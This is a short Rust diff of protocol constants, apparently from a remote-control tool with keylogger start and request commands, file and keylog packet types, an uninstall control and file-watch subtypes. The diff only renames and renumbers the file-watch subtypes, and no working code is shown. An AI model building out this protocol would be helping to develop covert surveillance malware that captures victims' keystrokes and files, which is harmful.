@@ -10,7 +10,7 @@ pub const PACKET_TYPE_CMD_RESP: u8 = 5;
 pub const PACKET_TYPE_FILE: u8 = 6;
 pub const PACKET_TYPE_KEYLOG: u8 = 7;
 pub const PACKET_TYPE_CTRL: u8 = 8;
-pub const PACKET_TYPE_FILE_WATCH: u8 = 9;  // ADD THIS
+pub const PACKET_TYPE_FILE_WATCH: u8 = 9;
 
 // Control subtypes
 pub const CTRL_START_KEYLOGGER: u8 = 1;
@@ -19,8 +19,9 @@ pub const CTRL_REQUEST_KEYLOG: u8 = 3;
 pub const CTRL_UNINSTALL: u8 = 4;
 
 // File watch subtypes
-pub const FILE_WATCH_UPDATE: u8 = 1;
-pub const FILE_WATCH_DELETE: u8 = 2;
+pub const FILE_WATCH_APPEND: u8 = 1;
+pub const FILE_WATCH_TRUNCATE: u8 = 2;
+pub const FILE_WATCH_DELETE: u8 = 3;
 
 pub const HEADER_SIZE: usize = 32;
 
